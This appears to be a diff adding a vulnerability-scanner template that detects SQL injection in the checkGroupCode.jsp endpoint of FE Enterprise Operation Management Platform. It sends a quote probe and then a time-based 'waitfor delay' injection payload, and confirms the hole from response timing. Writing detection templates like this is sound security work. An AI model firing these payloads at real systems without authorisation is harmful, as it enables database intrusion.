@@ -1,0 +1,43 @@
+id: flyrise-fe-checkgroupcode-sqli
+
+info:
+  name: FE Enterprise Operation Management Platform checkGroupCode SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection in the `checkGroupCode` endpoint of FE Enterprise Operation Management Platform.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /docexchangeManage/checkGroupCode.jsp?code=1' HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+  - raw:
+      - |
+        GET /docexchangeManage/checkGroupCode.jsp?code=1';waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"isSuccess":false'
+          - '"info":"参数异常'
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
